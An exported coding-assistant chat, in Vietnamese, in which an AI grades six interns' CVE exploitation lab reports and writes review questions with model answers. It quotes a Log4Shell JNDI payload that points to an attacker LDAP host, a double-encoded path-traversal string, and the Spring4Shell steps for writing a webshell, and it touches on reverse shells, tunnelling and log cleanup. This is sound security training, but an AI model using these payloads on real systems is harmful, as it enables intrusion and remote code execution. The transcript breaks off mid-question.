# Yêu cầu báo cáo thực tập sinh
_Exported on 4/10/2026 at 14:21:05 GMT+7 from Cursor (3.0.13)_

---

**User**

Đọc và phân tích các báo cáo của thực tập sinh theo các yêu cầu sau:
Anh gửi lại yêu cầu của tuần này và tuần sau nhé, mọi người nhớ thực hiện đầy đủ các yêu cầu dưới đây để bài báo cáo được đầy đủ nhé:
Yêu cầu:
1. Dựng môi trường Lab thủ công
2. Mô tả kiến trúc và các thành phần trong Lab
- Trình bày sơ đồ hệ thống (attacker – target – service liên quan)
- Mô tả rõ vai trò từng thành phần:
    + Target (ứng dụng bị lỗi)
    + Attacker machine
    + Các service trung gian (nếu có)
- Giải thích luồng hoạt động của hệ thống
3. Thực hiện khai thác lỗ hổng
-Mô tả chi tiết các bước:
    + Recon (nếu có)
    + Gửi payload
    + Trigger lỗ hổng
- Giải thích payload sử dụng
- Không sử dụng tool auto hoàn toàn (phải hiểu từng bước)
4. Show kết quả khai thác (Proof of Concept)
- Chứng minh khai thác thành công bằng hình ảnh hoặc video
5. Phân tích lỗ hổng
- Mô tả bản chất lỗ hổng:
    + Nguyên nhân gốc (root cause)
    + Điều kiện để khai thác
- Trình bày luồng tấn công (attack flow)
6. Phân tích bản vá (Patch Analysis)
- So sánh:
    + Trước khi vá (vulnerable)
    + Sau khi vá (patched)
- Giải thích:
    + Cơ chế fix lỗi
    + Tại sao fix này ngăn được khai thác

Với mỗi báo cáo hãy gợi ý các câu hỏi cho tôi để hỏi thực tập sinh xem hiểu phần mình làm thế nào

---

**Cursor**

Để tôi tìm và đọc các báo cáo trong workspace trước.

Tôi thấy có 6 file báo cáo PowerPoint (.pptx). Để tôi trích xuất nội dung từ các file này.

Tốt, tôi thấy 6 báo cáo. Giờ tôi sẽ trích xuất nội dung text từ tất cả các file PowerPoint.

Tôi đã đọc xong toàn bộ 6 báo cáo. Dưới đây là phân tích chi tiết theo từng yêu cầu và gợi ý câu hỏi cho mỗi thực tập sinh.

---

# PHÂN TÍCH BÁO CÁO TUẦN 2 - 6 THỰC TẬP SINH

---

## 1. LÊ ĐỨC HOÀNG — CVE-2020-1938 (Ghostcat - Apache Tomcat AJP)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐⭐ | Có mô hình thực nghiệm, nhưng thiếu chi tiết cài đặt (OS, IP, phiên bản cụ thể từng máy) |
| 2. Mô tả kiến trúc | ⭐⭐⭐⭐ | Attack flow rõ ràng 7 bước (Recon → Ghostcat → LFI → Upload → AJP include → RCE → Chiếm quyền). Có giải thích vai trò AJP, Tomcat, DocVault |
| 3. Khai thác lỗ hổng | ⭐⭐⭐⭐⭐ | Rất chi tiết - phân tích từng class trong exploit (AjpForwardRequest, AjpResponse, Tomcat class). Giải thích cơ chế serialization, attribute injection. Có Nmap recon |
| 4. PoC | ⭐⭐⭐⭐ | Đọc web.xml thành công, Gobuster tìm /uploads, upload shell.jsp, reverse shell → root. Có hình ảnh |
| 5. Phân tích lỗ hổng | ⭐⭐⭐⭐⭐ | Xuất sắc - phân tích 4 file source code: AbstractAjpProcessor.java, DefaultServlet.java, JspServlet.java, server.xml. Chỉ rõ root cause ở `request.setAttribute(n, v)` không có blacklist |
| 6. Phân tích bản vá | ⭐⭐⭐⭐ | Có 2 cách vá: whitelist attribute bằng regex + 403, và vô hiệu hóa/restrict AJP connector. Giải thích rõ |

**Tổng đánh giá: 8.5/10** — Báo cáo rất chất lượng, phân tích mã nguồn exploit sâu, root cause analysis rõ ràng. Điểm trừ: phần dựng lab thiếu chi tiết.

### Gợi ý câu hỏi cho Lê Đức Hoàng:

1. **"Giao thức AJP khác gì so với HTTP? Tại sao Tomcat lại cần cổng 8009 bên cạnh cổng 8080?"** — Kiểm tra hiểu biết nền tảng về AJP.

2. **"Trong exploit, tại sao 3 thuộc tính `javax.servlet.include.request_uri`, `javax.servlet.include.path_info`, `javax.servlet.include.servlet_path` lại quan trọng? Nếu thiếu 1 trong 3 thì sao?"** — Kiểm tra hiểu sâu về cơ chế Servlet include.

3. **"Nếu firewall chặn cổng 8009 nhưng mở cổng 8080, em có cách nào khai thác Ghostcat không?"** — Kiểm tra hiểu giới hạn của lỗ hổng.

4. **"Tại sao `AbstractAjpProcessor.prepareRequest()` lại tin tưởng các attribute từ client? Điều này vi phạm nguyên tắc bảo mật nào?"** — Kiểm tra tư duy bảo mật (trust boundary).

5. **"Giải thích sự khác biệt giữa LFI qua Ghostcat (đọc file) và RCE qua Ghostcat (thực thi file). Điều kiện gì để LFI leo thang thành RCE?"** — Kiểm tra hiểu rõ chuỗi tấn công.

6. **"Bản vá dùng regex whitelist cho allowed attributes. Em có thể nghĩ ra cách bypass whitelist này không? Regex có điểm yếu nào?"** — Kiểm tra tư duy offensive.

---

## 2. NGUYỄN BÁ HẢI LONG — CVE-2022-22965 (Spring4Shell)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐⭐⭐⭐ | Lab phức tạp nhất: WAN/DMZ/LAN 3 lớp, pfSense firewall, port forwarding, MySQL backend. Có firewall rules chi tiết |
| 2. Mô tả kiến trúc | ⭐⭐⭐⭐⭐ | Sơ đồ mạng rõ ràng, 3 subnet, luật firewall cho WAN↔DMZ, DMZ→LAN(chỉ 192.168.10.11). Giải thích luồng rõ |
| 3. Khai thác lỗ hổng | ⭐⭐⭐⭐⭐ | Chuỗi tấn công hoàn chỉnh: CVE exploit → Chisel tunnel → Credential theft → UDF injection → Crontab privesc → Log cleanup |
| 4. PoC | ⭐⭐⭐⭐⭐ | Mỗi bước đều có screenshot: whoami, reverse shell, chisel, MySQL, UDF, root shell |
| 5. Phân tích lỗ hổng | ⭐⭐⭐⭐ | Giải thích CachedIntrospectionResults, DataBinding qua @ModelAttribute, Java 9 module bypass. Nhưng thiếu phân tích code chi tiết hơn |
| 6. Phân tích bản vá | ⭐⭐⭐⭐⭐ | Rất toàn diện: update version, least privilege MySQL, crontab permissions, credential protection (.bashrc), code-level fix (InitBinder) |

**Tổng đánh giá: 9.5/10** — Báo cáo xuất sắc nhất. Lab phức tạp 3 lớp mạng, chuỗi tấn công đầy đủ từ initial access → lateral movement → privilege escalation → cleanup. Thể hiện tư duy pentest thực tế.

### Gợi ý câu hỏi cho Nguyễn Bá Hải Long:

1. **"Giải thích cụ thể cơ chế DataBinding trong Spring MVC. Tại sao `class.module.classLoader` bypass được bản vá CVE-2010-1622 mà `class.classLoader` thì không?"** — Kiểm tra hiểu root cause cốt lõi.

2. **"Payload của em ghi file AccessLogValve. Tại sao lại chọn AccessLogValve mà không phải một class khác? Có những class nào khác có thể bị lạm dụng tương tự?"** — Kiểm tra hiểu sâu về chuỗi property traversal.

3. **"Trong phần UDF injection vào MySQL, nếu `secure_file_priv` không rỗng mà trỏ đến một thư mục cụ thể, em có thể bypass không? Bằng cách nào?"** — Kiểm tra hiểu MySQL security.

4. **"Em dùng Chisel để tạo tunnel từ WAN vào DMZ. Nếu firewall có DPI (Deep Packet Inspection) phát hiện Chisel traffic, em có phương án thay thế nào?"** — Kiểm tra kiến thức tunneling/evasion.

5. **"Phần xóa dấu vết: em xóa log và bash history. Còn những artifact nào khác có thể để lại trên hệ thống mà blue team có thể phát hiện?"** — Kiểm tra kiến thức forensics.

6. **"Tại sao Spring chỉ dễ bị tấn công khi deploy dạng WAR trên Tomcat mà không bị khi chạy embedded jar? Sự khác biệt kỹ thuật ở đâu?"** — Kiểm tra hiểu biết về ClassLoader hierarchy.

---

## 3. NGUYỄN HỮU DŨNG — CVE-2020-14882 & CVE-2020-14883 (Oracle WebLogic)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐⭐⭐⭐ | Sáng tạo - tự viết Lab bằng NodeJS mô phỏng hành vi WebLogic (server.js, securityFilter.js, vulnerableRouter.js). Không dùng WebLogic thật |
| 2. Mô tả kiến trúc | ⭐⭐⭐⭐⭐ | Sơ đồ 3 thành phần rõ: Attacker → Middleware (securityFilter.js) → Target Core (vulnerableRouter.js). Mô tả vai trò từng phần, giải thích luồng |
| 3. Khai thác lỗ hổng | ⭐⭐⭐⭐ | Giải thích double encoding (%252e → %2e → .), path traversal, RCE qua handle parameter. Có từng bước |
| 4. PoC | ⭐⭐⭐⭐ | Screenshot bypass auth, dashboard access, command execution (dir, type) |
| 5. Phân tích lỗ hổng | ⭐⭐⭐⭐ | Root cause: URI parsing inconsistency, startsWith vs decodeURIComponent. Attack flow 2 bước (14882 bypass + 14883 RCE) |
| 6. Phân tích bản vá | ⭐⭐⭐⭐⭐ | Fix cả 2 CVE: securityFilter.js (double decode + blacklist ..), vulnerableRouter.js (remove exec, input validation), server.js |

**Tổng đánh giá: 8.5/10** — Điểm cộng lớn cho việc tự code Lab mô phỏng WebLogic bằng NodeJS, thể hiện hiểu rõ bản chất lỗ hổng. Patch analysis tốt với code before/after.

### Gợi ý câu hỏi cho Nguyễn Hữu Dũng:

1. **"Tại sao em chọn tự viết Lab bằng NodeJS thay vì dùng WebLogic thật? Lab NodeJS của em có mô phỏng chính xác 100% hành vi WebLogic không? Có điểm nào khác biệt?"** — Kiểm tra mức độ hiểu sự khác biệt giữa mô phỏng và thực tế.

2. **"Giải thích chi tiết quá trình double encoding: `../ → %2e%2e%2f → %252e%252e%252f`. Tại sao trình duyệt/proxy tự động decode 1 lần, và tại sao middleware chỉ thấy `%2e` mà không thấy `..`?"** — Kiểm tra hiểu URL encoding sâu.

3. **"Trong CVE-14883, tham số `handle` gọi `com.tangosol.coherence.mvel2.sh.ShellSession`. Nếu class này bị chặn, em biết class nào khác trên WebLogic có thể bị lạm dụng để RCE không?"** — Kiểm tra kiến thức về Java classpath exploitation.

4. **"Bản vá của em dùng blacklist `..` sau khi double decode. Có cách nào bypass blacklist này không? (Gợi ý: triple encoding, Unicode normalization, null byte...)"** — Kiểm tra tư duy bypass.

5. **"Trên WebLogic thật, CVE-2020-14882 ảnh hưởng phiên bản nào? Oracle đã vá bằng cách nào? So sánh bản vá của Oracle với bản vá NodeJS của em."** — Kiểm tra xem có nghiên cứu bản vá gốc không.

6. **"Tại sao securityFilter kiểm tra bằng `startsWith('/console/images/')` lại nguy hiểm? Nguyên tắc bảo mật nào bị vi phạm ở đây?"** — Kiểm tra hiểu biết về allowlist vs pattern matching.

---

## 4. TRẦN VIỆT BÁCH — CVE-2021-44228 (Log4Shell)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐ | Có mô hình nhưng rất sơ sài, thiếu thông tin IP, OS, version cụ thể |
| 2. Mô tả kiến trúc | ⭐⭐ | Chỉ có slide "Mô hình" và "Giao diện", không mô tả chi tiết vai trò từng thành phần |
| 3. Khai thác lỗ hổng | ⭐⭐⭐ | Có các bước: LDAP server, HTTP server, payload, compile Exploit.java, reverse shell. Nhưng THIẾU giải thích payload, thiếu nội dung Exploit.java |
| 4. PoC | ⭐⭐⭐ | Có reverse shell thành công (slide 12), nhưng chủ yếu dựa vào hình ảnh |
| 5. Phân tích lỗ hổng | ⭐⭐⭐ | Liệt kê đúng luồng: log → `${` detection → substitute() → resolveVariable → lookup → execute. NHƯNG mỗi slide chỉ có tiêu đề, thiếu giải thích chi tiết |
| 6. Phân tích bản vá | ⭐ | Chỉ ghi "Trước khi vá" và "Sau khi vá" mà KHÔNG giải thích cơ chế fix, tại sao fix ngăn khai thác |

**Tổng đánh giá: 4.5/10** — Báo cáo yếu nhất. Nội dung text rất ít, dựa quá nhiều vào hình ảnh (không có trong text). Phần phân tích luồng code đúng hướng nhưng quá sơ sài. Phân tích bản vá gần như không có. Cần cải thiện nhiều.

### Gợi ý câu hỏi cho Trần Việt Bách:

1. **"Giải thích chi tiết payload `${jndi:ldap://192.168.58.135:1389/Exploit}` — Từng phần `jndi`, `ldap`, `1389`, `Exploit` có ý nghĩa gì? Nếu thay `ldap` bằng `rmi` hoặc `dns` thì sao?"** — Kiểm tra hiểu payload cơ bản.

2. **"File Exploit.java của em chứa gì? Giải thích từng dòng code trong đó."** — Kiểm tra xem có tự viết exploit hay copy.

3. **"Trong luồng code, em nói Log4j gọi `substitute()` → `resolveVariable()`. Hàm `resolveVariable()` cụ thể làm gì? Nó gọi tiếp đến class/method nào?"** — Kiểm tra hiểu sâu luồng code vì báo cáo quá sơ sài.

4. **"Bản vá Log4j 2.17.0 đã fix bằng cách nào? Tại sao bản 2.15.0 fix chưa đủ mà phải đến 2.17.0? (Gợi ý: CVE-2021-45046, CVE-2021-45105)"** — Kiểm tra xem có nghiên cứu kỹ bản vá chưa, vì phần này gần như trống.

5. **"JNDI lookup trong Log4j hoạt động thế nào? Tại sao một thư viện logging lại cần tính năng JNDI? Mục đích ban đầu của tính năng này là gì?"** — Kiểm tra hiểu bối cảnh thiết kế.

6. **"Nếu hệ thống không có kết nối ra Internet (air-gapped), Log4Shell có khai thác được không? Nếu có thì bằng cách nào?"** — Kiểm tra hiểu giới hạn và biến thể.

---

## 5. ĐÀM PHƯƠNG LINH — CVE-2023-22515 (Atlassian Confluence)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐⭐⭐ | Rõ ràng: Kali (10.48.137.227, 4GB RAM) + Confluence 8.5.1 (10.48.137.228, 8GB RAM, PostgreSQL). Có specs |
| 2. Mô tả kiến trúc | ⭐⭐⭐⭐ | Attack flow 5 bước rõ ràng, mô tả từng bước từ request → Struts2 → setter → state change → bypass |
| 3. Khai thác lỗ hổng | ⭐⭐⭐⭐⭐ | Xuất sắc - Debug sâu vào Struts2 interceptors (SetupCheckInterceptor, SafeParametersInterceptor), phân tích OGNL, ASTChain, class hierarchy |
| 4. PoC | ⭐⭐⭐⭐ | Burp Suite, payload qua Repeater, tạo admin thành công, truy cập admin panel |
| 5. Phân tích lỗ hổng | ⭐⭐⭐⭐⭐ | Root cause 3 lớp: Broken Access Control + Unsafe Data Binding + Mutable State. Debug trace qua BootstrapStatusProviderImpl, ServerInfoAction, ConfluenceActionSupport |
| 6. Phân tích bản vá | ⭐⭐⭐⭐⭐ | 3 biện pháp rõ: xóa endpoint, ReadOnlyApplicationConfig wrapper, không expose object thật. So sánh code 8.5.1 vs 8.5.2 |

**Tổng đánh giá: 9/10** — Báo cáo rất chất lượng. Phân tích code Struts2 sâu, debug trace chi tiết, root cause analysis xuất sắc với 3 lớp nguyên nhân. Patch analysis so sánh 2 version rõ ràng.

### Gợi ý câu hỏi cho Đàm Phương Linh:

1. **"Giải thích chi tiết cơ chế Struts2 Data Binding. `SafeParametersInterceptor` khác gì `ParametersInterceptor` gốc? Tại sao 'Safe' mà vẫn bị bypass?"** — Kiểm tra hiểu framework internals.

2. **"Em nói ASTEval không thể invoke method nhưng ASTChain (a.b) có thể gọi getter/setter. Giải thích sự khác biệt giữa ASTEval và ASTChain trong OGNL. Tại sao Confluence chỉ chặn ASTEval?"** — Kiểm tra hiểu OGNL parser.

3. **"Nếu endpoint `/server-info.action` bị xóa (như bản vá), nhưng có endpoint khác cũng kế thừa `ConfluenceActionSupport` và có DataBinding, em có thể tìm attack surface mới không?"** — Kiểm tra tư duy variant analysis.

4. **"ReadOnlyApplicationConfig chặn setter. Nếu có một Java reflection vulnerability cho phép bypass wrapper, chuỗi tấn công sẽ thế nào?"** — Kiểm tra tư duy chained exploit.

5. **"`setupComplete` là một boolean field đơn giản. Tại sao Atlassian lại thiết kế cho nó có public setter? Đây là lỗi thiết kế hay yêu cầu chức năng?"** — Kiểm tra tư duy secure design.

6. **"CVSS 10.0 — em có đồng ý với điểm này không? So sánh với Log4Shell (cũng 10.0), lỗ hổng nào nguy hiểm hơn trong thực tế và tại sao?"** — Kiểm tra khả năng đánh giá rủi ro.

---

## 6. PHẠM LÊ NAM — CVE-2019-17558 (Apache Solr RCE)

### Đánh giá theo yêu cầu:

| Yêu cầu | Đánh giá | Ghi chú |
|---|---|---|
| 1. Dựng Lab thủ công | ⭐⭐⭐ | Cài Solr, tạo core "demo". Nhưng thiếu chi tiết OS, IP, phiên bản cụ thể |
| 2. Mô tả kiến trúc | ⭐⭐ | Chỉ có "Sơ đồ tổng quan" (slide 3) mà không mô tả chi tiết vai trò từng thành phần, thiếu luồng hoạt động |
| 3. Khai thác lỗ hổng | ⭐⭐⭐ | Có 4 bước (recon, khám phá, khai thác, reverse shell). Nmap quét 8983. NHƯNG thiếu giải thích chi tiết payload Config API và Velocity template |
| 4. PoC | ⭐⭐⭐ | Reverse shell thành công. Nhưng ít screenshot minh chứng quá trình |
| 5. Phân tích lỗ hổng | ⭐⭐⭐ | Nêu đúng root cause (SSTI + VelocityResponseWriter + params.resource.loader.enabled). Nhưng quá ngắn gọn, thiếu phân tích code |
| 6. Phân tích bản vá | ⭐⭐ | Chỉ nêu: update version, IP whitelist, disable velocity. KHÔNG có so sánh code trước/sau, không giải thích cơ chế fix cụ thể |

**Tổng đánh giá: 5.5/10** — Báo cáo đáp ứng cơ bản nhưng thiếu chiều sâu. Khai thác đúng quy trình nhưng thiếu giải thích payload. Root cause đúng nhưng sơ sài. Patch analysis yếu nhất — chỉ liệt kê mà không phân tích.

### Gợi ý câu hỏi cho Phạm Lê Nam:

1. **"Giải thích chi tiết payload Config API mà em gửi để thay đổi VelocityResponseWriter. Request đó có body gì? Tại sao Solr lại cho phép thay đổi config qua API mà không cần xác thực?"** — Kiểm tra hiểu payload cốt lõi.

2. **"VelocityResponseWriter là gì? Velocity Template Engine hoạt động thế nào? Tại sao `params.resource.loader.enabled=true` lại nguy hiểm?"** — Kiểm tra hiểu thành phần bị lỗi.

3. **"Payload Velocity template của em chứa gì cụ thể? Giải thích từng phần của template đó."** — Kiểm tra xem có hiểu payload SSTI hay chỉ copy.

4. **"SSTI (Server-Side Template Injection) là gì? So sánh SSTI trong Solr Velocity với SSTI trong Jinja2 (Python) hoặc FreeMarker (Java). Nguyên lý chung là gì?"** — Kiểm tra hiểu lớp lỗ hổng tổng quát.

5. **"Em nói vá bằng cách 'xóa hoặc vô hiệu hóa velocity'. Cụ thể trong file cấu hình nào? Dòng config nào cần thay đổi? Nếu ứng dụng cần Velocity để hiển thị UI thì sao?"** — Kiểm tra hiểu thực tế của việc vá.

6. **"Bản vá chính thức từ Apache Solr 8.4.0 đã thay đổi gì trong code? `params.resource.loader.enabled` mặc định là gì ở bản mới?"** — Kiểm tra xem có nghiên cứu bản vá chính thức không.

---

## BẢNG TỔNG HỢP XẾP HẠNG

| Hạng | Thực tập sinh | CVE | Điểm | Điểm mạnh | Cần cải thiện |
|---|---|---|---|---|---|
| 1 | **Nguyễn Bá Hải Long** | CVE-2022-22965 | **9.5/10** | Lab 3 lớp mạng, chuỗi tấn công hoàn chỉnh (CVE→tunnel→privesc→cleanup), patch toàn diện | Phân tích code root cause có thể sâu hơn |
| 2 | **Đàm Phương Linh** | CVE-2023-22515 | **9/10** | Debug Struts2 sâu, root cause 3 lớp, so sánh code 2 version | Lab đơn giản hơn |
| 3 | **Lê Đức Hoàng** | CVE-2020-1938 | **8.5/10** | Phân tích exploit code chi tiết, root cause 4 file Java | Mô tả lab setup sơ sài |
| 3 | **Nguyễn Hữu Dũng** | CVE-2020-14882 | **8.5/10** | Sáng tạo tự viết Lab NodeJS, patch analysis rõ | Cần so sánh với WebLogic thật |
| 5 | **Phạm Lê Nam** | CVE-2019-17558 | **5.5/10** | Đúng quy trình, đúng root cause | Thiếu chiều sâu ở mọi phần, patch analysis yếu |
| 6 | **Trần Việt Bách** | CVE-2021-44228 | **4.5/10** | Luồng code analysis đúng hướng | Nội dung quá sơ sài, patch analysis gần như trống, thiếu giải thích |

---

## NHẬN XÉT CHUNG

**Nhóm đầu (Hải Long, Phương Linh, Đức Hoàng, Hữu Dũng):** Thể hiện hiểu sâu lỗ hổng, có khả năng phân tích mã nguồn, giải thích rõ ràng. Đặc biệt Hải Long xây dựng chuỗi tấn công thực tế nhất và Phương Linh debug code framework sâu nhất.

**Nhóm cần cải thiện (Lê Nam, Việt Bách):**
- **Phạm Lê Nam**: Cần bổ sung giải thích chi tiết payload, so sánh code trước/sau khi vá, mô tả kiến trúc lab kỹ hơn.
- **Trần Việt Bách**: Cần viết lại phần lớn báo cáo — bổ sung nội dung text thay vì chỉ dựa vào hình, phân tích bản vá cần làm lại hoàn toàn, giải thích từng bước khai thác.

Trên đây là toàn bộ phân tích 6 báo cáo. Mỗi thực tập sinh có 6 câu hỏi gợi ý, thiết kế theo hướng:
- **Câu 1-2**: Kiểm tra hiểu bản chất kỹ thuật cốt lõi
- **Câu 3-4**: Kiểm tra tư duy mở rộng / bypass / offensive thinking
- **Câu 5-6**: Kiểm tra kiến thức tổng quan và khả năng đánh giá

Anh cần tôi đi sâu vào phân tích báo cáo nào cụ thể hơn không?

---

**User**

Đọc cả hình ảnh nữa để nhận xét, mà câu hỏi thì nhớ có câu trả lời nhá

---

**Cursor**

Để tôi trích xuất hình ảnh từ tất cả các file PowerPoint để xem xét kỹ hơn.

Giờ tôi cần map hình ảnh vào từng slide. Để tôi trích xuất thông tin đó.

Giờ tôi sẽ đọc các hình ảnh nội dung quan trọng từ mỗi báo cáo. Để tôi re-extract với tên gốc để dễ map.

Bây giờ tôi sẽ đọc các hình ảnh quan trọng nhất từ mỗi báo cáo - tập trung vào sơ đồ lab, PoC, code, và patch.

Tốt, đã xem xong ảnh của Lê Đức Hoàng. Tiếp tục với các báo cáo khác.

Tốt, giờ xem ảnh của Nguyễn Hữu Dũng và Trần Việt Bách.

Giờ đọc ảnh của Trần Việt Bách (báo cáo có ít text nhất, phụ thuộc ảnh nhiều nhất).

Giờ xem ảnh của Đàm Phương Linh và Phạm Lê Nam.

Tôi đã xem xong tất cả hình ảnh quan trọng từ 6 báo cáo. Giờ tôi sẽ cập nhật đánh giá hoàn chỉnh với nhận xét về hình ảnh và câu hỏi kèm đáp án.

Dưới đây là phân tích **cập nhật** sau khi xem hình ảnh, kèm câu hỏi **có đáp án** cho từng thực tập sinh.

---

# PHÂN TÍCH BÁO CÁO TUẦN 2 — CẬP NHẬT SAU KHI XEM HÌNH ẢNH

---

## 1. LÊ ĐỨC HOÀNG — CVE-2020-1938 (Ghostcat)

### Nhận xét hình ảnh:
- **Sơ đồ Lab**: Rõ ràng — Attacker (Kali, 192.168.21.153) ↔ Victim (Ubuntu, Apache Tomcat 8.5.50, port 8009 AJP + 8080 HTTP, 192.168.21.196). Có ghi rõ OS, IP, version, port.
- **Nmap scan**: Screenshot nmap vulners cho thấy AJP13 port 8009 open, Tomcat 8.5.50, và tham chiếu PACKETSTORM exploit — rất tốt.
- **Exploit code**: Ảnh chụp code Python rõ ràng — class `AjpForwardRequest` với các constant, method serialization.
- **PoC**: Screenshot đọc web.xml thành công qua `python2 CVE-2020-1938-poc.py`, Gobuster tìm `/uploads`, upload shell.jsp, netcat reverse shell → **root** — chuỗi hoàn chỉnh.
- **Root cause**: Ảnh code Java gốc `AbstractAjpProcessor.java` với `request.setAttribute(n, v)` không lọc — highlight rất rõ.
- **Patch**: Code bản vá với `allowedRequestAttributesPattern` regex matcher, và server.xml comment AJP connector + address="::1".

**Điểm cập nhật: 9/10** (tăng từ 8.5 — hình ảnh bổ sung rất tốt cho text)

### Câu hỏi kèm đáp án:

**Q1: "Giao thức AJP khác gì so với HTTP? Tại sao Tomcat cần cổng 8009 bên cạnh 8080?"**

> **Đáp án:** AJP (Apache JServ Protocol) là giao thức nhị phân (binary protocol) được thiết kế để giao tiếp giữa web server phía trước (Apache HTTPD, Nginx) và Tomcat phía sau. Khác với HTTP là text-based, AJP đóng gói request thành binary packets nhỏ gọn hơn, giảm overhead khi parse. Cổng 8009 dùng cho reverse proxy pattern: Apache HTTPD nhận request HTTP từ client, chuyển qua AJP sang Tomcat xử lý. Lợi ích: Apache xử lý static content, SSL termination; Tomcat tập trung xử lý Java logic. Vấn đề: AJP ban đầu được thiết kế cho giao tiếp nội bộ tin cậy, nên không có cơ chế xác thực.

**Q2: "Trong exploit, 3 thuộc tính `javax.servlet.include.*` có vai trò gì? Thiếu 1 trong 3 thì sao?"**

> **Đáp án:** Ba thuộc tính hoạt động cùng nhau theo Servlet Spec: `request_uri` xác định context ứng dụng (VD: `/`), `servlet_path` chỉ đến Servlet xử lý (VD: `/` cho DefaultServlet), `path_info` chứa đường dẫn file cần include (VD: `/WEB-INF/web.xml`). Khi cả 3 được set, Tomcat sẽ include file đó vào response. Nếu thiếu `path_info` → không có target file → không rò rỉ. Nếu thiếu `servlet_path` → DefaultServlet không được kích hoạt → request không được xử lý đúng. Nếu thiếu `request_uri` → Tomcat có thể không xác định được context.

**Q3: "Nếu firewall chặn cổng 8009 nhưng mở 8080, có khai thác được Ghostcat không?"**

> **Đáp án:** Không. Ghostcat chỉ khai thác được qua giao thức AJP trên cổng 8009. Cổng 8080 là HTTP Connector, không chấp nhận AJP packets. Đây chính là lý do bản vá đầu tiên đề xuất chặn/restrict cổng 8009. Tuy nhiên, nếu attacker đã có foothold trên cùng mạng nội bộ (lateral movement) và 8009 chỉ bị chặn từ bên ngoài, vẫn có thể khai thác từ bên trong.

**Q4: "Tại sao `request.setAttribute(n, v)` không lọc lại nguy hiểm? Vi phạm nguyên tắc bảo mật nào?"**

> **Đáp án:** Vi phạm nguyên tắc **"Never Trust User Input"** (Zero Trust). AJP connector nhận attribute name và value trực tiếp từ gói tin mạng (do attacker kiểm soát) rồi gán thẳng vào Request object mà không validate. Các thuộc tính `javax.servlet.include.*` vốn chỉ dành cho internal dispatch mechanism (RequestDispatcher), nhưng vì không có allowlist/denylist, attacker tiêm được từ bên ngoài. Đây còn vi phạm nguyên tắc **Least Privilege** — AJP connector không nên có quyền set internal-only attributes.

**Q5: "LFI khác RCE trong Ghostcat thế nào? Điều kiện leo thang?"**

> **Đáp án:** LFI (đọc file) xảy ra khi `servlet_path` trỏ đến DefaultServlet (`/`) → Tomcat đọc file raw và trả nội dung. RCE xảy ra khi `servlet_path` trỏ đến JspServlet → Tomcat biên dịch và **thực thi** file đó như JSP. Điều kiện leo thang LFI→RCE: (1) Ứng dụng web phải cho phép upload file lên server, (2) File upload phải nằm trong document root mà Tomcat đọc được, (3) File upload chứa mã JSP hợp lệ (dù extension là .txt, .jpg). Nếu không có upload → chỉ dừng ở LFI đọc file nhạy cảm.

---

## 2. NGUYỄN BÁ HẢI LONG — CVE-2022-22965 (Spring4Shell)

### Nhận xét hình ảnh:
- **Sơ đồ mạng**: Xuất sắc — 3 lớp WAN/DMZ/LAN qua pfSense firewall. WAN (Kali 192.168.202.128), DMZ (Ubuntu 22.04, Tomcat 9.0.0 M1, Spring 5.3.16, JDK 11 — IP 192.168.91.10), LAN (Ubuntu 22.04, MySQL — IP 192.168.10.11). Thông tin rất đầy đủ.
- **Attack flow diagram**: Sơ đồ 8 bước chi tiết từ DataBinding → CachedIntrospectionResults → AccessLogValve → WebShell → RCE. Rất chuyên nghiệp.
- **Code analysis**: Ảnh code `CachedIntrospectionResults` chỉ ignore `classLoader` và `protectionDomain` — thiếu `module`. Giải thích Java 9 bypass rõ.
- **Credential theft**: Screenshot `application.properties` có `spring.datasource.url`, username=root, password=NguyenBaHaiLong23# → rất thực tế.
- **MySQL**: proxychains kết nối qua chisel tunnel, kiểm tra `File_priv=Y`, UDF injection.
- **Crontab**: `/opt/script/backup.sh` chạy mỗi phút bởi root, mysql user có quyền ghi → inject reverse shell.
- **Root shell**: whoami=root trên pfsense-virtual-machine thành công.
- **Patch**: Code `GlobalSecurityAdvice.java` dùng `@InitBinder` + `setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*")`, UFW fix, credential ẩn trong .bashrc, crontab chown root:root.

**Điểm giữ nguyên: 9.5/10** — Hình ảnh xác nhận lab phức tạp nhất, chuỗi tấn công hoàn chỉnh nhất.

### Câu hỏi kèm đáp án:

**Q1: "Giải thích tại sao `class.module.classLoader` bypass được bản vá CVE-2010-1622 mà `class.classLoader` không?"**

> **Đáp án:** Bản vá CVE-2010-1622 trong `CachedIntrospectionResults` chỉ blacklist `class.classLoader` và `class.protectionDomain` (kiểm tra `pd.getName().equals("classLoader")`). Trong Java 8 trở xuống, `Object.getClass()` chỉ có thể gọi `.getClassLoader()` trực tiếp → bị chặn. Java 9 thêm Module System, mỗi Class có thêm phương thức `getModule()` trả về `Module` object, và `Module` có `getClassLoader()`. Nên chuỗi `class.module.classLoader` đi đường vòng: `getClass()` → `getModule()` → `getClassLoader()`. Vì `module` không nằm trong blacklist, Spring cho phép bind → attacker truy cập được ClassLoader.

**Q2: "Tại sao chọn AccessLogValve để ghi webshell? Có class nào khác bị lạm dụng tương tự?"**

> **Đáp án:** AccessLogValve được chọn vì: (1) Nó nằm trong Tomcat pipeline, truy cập được qua `classLoader.resources.context.parent.pipeline.first`, (2) Nó có các setter public cho `directory`, `prefix`, `suffix`, `pattern` → attacker kiểm soát nơi ghi file và nội dung ghi, (3) Pattern của access log chấp nhận `%{header}i` → chèn JSP code vào header, log ra file .jsp. Các class khác có thể bị lạm dụng: `StandardContext` (thay đổi docBase), `NamingResources` (thay đổi JNDI datasource). Nhưng AccessLogValve là target ổn định nhất vì luôn tồn tại trong Tomcat default config.

**Q3: "Nếu `secure_file_priv` không rỗng mà trỏ đến `/tmp`, em có bypass được UDF injection không?"**

